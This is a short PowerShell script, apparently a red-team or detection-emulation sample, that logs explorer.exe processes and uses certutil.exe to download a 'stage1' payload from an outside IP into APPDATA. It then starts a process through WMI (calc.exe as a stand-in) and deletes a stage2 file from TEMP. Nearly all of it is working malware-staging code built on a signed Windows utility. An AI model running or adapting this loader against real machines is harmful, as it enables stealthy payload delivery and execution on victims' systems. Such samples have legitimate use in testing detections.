<#
.SYNOPSIS
    WMI inventory and LOLBin handoff helper.

.DESCRIPTION
    Collects a short process inventory, downloads a payload stage
    payload through a signed Windows utility and starts a benign
    execution target.
#>
[CmdletBinding()]
param(
    [string]$EndpointUrl = 'http://192.0.2.86:80/stage1.ps1',
    [string]$PayloadPath = "$env:APPDATA\payload.bin",
    [int]$TimeoutSec = 86
)
$ErrorActionPreference = "Continue"

Write-Verbose "Collecting process inventory"
Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -eq "explorer.exe" } | Select-Object ProcessId,Name,CommandLine | Out-File 'C:\ProgramData\stage.log' -Append -ErrorAction SilentlyContinue
certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath
$ResultObject = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" } -ErrorAction SilentlyContinue
Write-Verbose ("Process ID: " + $ResultObject.ProcessId)

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
